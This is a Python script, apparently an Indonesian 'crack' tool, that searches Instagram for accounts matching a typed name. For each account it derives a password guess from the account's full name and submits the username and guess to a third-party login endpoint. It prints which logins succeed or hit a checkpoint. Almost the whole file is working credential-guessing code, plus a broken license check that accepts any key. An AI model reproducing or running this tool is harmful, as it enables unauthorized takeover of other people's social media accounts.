import requests as r, json, os, time
from bs4 import BeautifulSoup as par
expired = ['14','10','2020']
garis = ("\x1b[1;92m-"*40)
logo = ("""\x1b[1;91m
        _____ __________.___
       /     \\______   \   |
      /  \ /  \|    |  _/   |By:Faqih ID
     /    Y    \    |   \   |
     \____|__  /______  /___|
             \/       \/""")

def main():
	os.system('clear')
	print(logo)
	print(garis)
	name = input('\x1b[1;91m# \x1b[1;97mSearch Name:\x1b[1;96m ')
	try:
		a = r.get(f"https://www.instagram.com/web/search/topsearch/?context=blended&query={name}").text
	except r.exceptions.ConnectionError:
		exit('\x1b[1;91m! \x1b[1;97mHidupkan Koneksimu\n')
	print("\x1b[1;91m! \x1b[1;97mProcessing Crack...")
	print(garis)
	b = json.loads(a)
	for c in b['users']:
		user = c['user']['username']
		full = c['user']['full_name']
		try:
			sp = full.split(" ")
			pw = (sp[0]+sp[1]).lower()

			run = r.post('https://outig.com/login/user_login.php', data={'username':user,'password':pw}, headers={'accept': 'application/json, text/javascript, */*; q=0.01','user-agent': 'Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','x-requested-with':'XMLHttpRequest','referer': 'https://outig.com/login/'}).text
			ron = par(run,"html.parser")
			rom = ron.find('b')
			maen = ("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] CRACKING :\x1b[1;96m "+user+" \x1b[1;91m|\x1b[1;96m "+pw+" "+rom.text).replace("<\/div>","").replace("<\/b>","").replace("\/","/").replace('"}','').replace('Status: Gagal masuk username/password salah.','\n             \x1b[1;97m> \x1b[1;91mGagal Masuk').replace('Status: Sukses masuk, mengalihkan ...','\n             \x1b[1;97m> \x1b[1;94mLogin Succes \x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]').replace('Status: Checkpoint verifikasi akun anda..','\n             \x1b[1;97m> \x1b[1;94mLogin Succes \x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]').replace(' Status: Gagal kesalahan tidak di ketahui.','\n             \x1b[1;97m> \x1b[1;91mKesalahan Login')
			print(maen)
			print(garis)
		except IndexError:
			pass

def mulai():
	from datetime import datetime
	saat_ini = datetime.now()
	tgl = saat_ini.strftime('%d')
	bln = saat_ini.strftime('%m')
	thn = saat_ini.strftime('%Y')
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		print(logo)
		print(garis)
		exit('\x1b[1;91m! \x1b[1;97mTools Sudah Kadaluarsa\n\x1b[1;91m! \x1b[1;97mSilahkan Update Tools Terbarunya\n'+garis+'\n\n')
	else:
		license()

def license():
	print(logo)
	print(garis)
	print("\x1b[1;91m# \x1b[1;97mDownload License: \x1b[1;92mhttps://semawur.com/xOMVNsN")
	koy = input("\x1b[1;91m# \x1b[1;97mLicense:\x1b[1;92m ")
	if koy =="":
		exit('\x1b[1;91m! \x1b[1;97mLicense Tidak Boleh Kosong\n')
	try:
		get = r.get(koy).text
		jso = json.loads(get)
		if 'HKHUzMbBJsuBkuZ' or '4tmvJ354qTxb2bw' or 'LP3kmeFSWSTmQYk' or 'be42JbdBybV9jxE' or 'ckL7UDJM2GzuujZ' or 'nRLmX5UFj86nYrT' in jso["key"]:
			print("\x1b[1;91m* \x1b[1;97mLicense \x1b[1;92mValid")
			time.sleep(2)
			main()
		else:
			exit("\x1b[1;91m! \x1b[1;97mLicensi Tidak \x1b[1;91mValid\n")
	except (r.exceptions.MissingSchema, r.exceptions.InvalidURL):
		exit('\x1b[1;91m! \x1b[1;97mIsi License Yang Benar\n')
	except:
		exit('\x1b[1;91m! \x1b[1;97mIsi License Yang Benar\n')

if __name__=="__main__":
	os.system('clear')
	mulai()
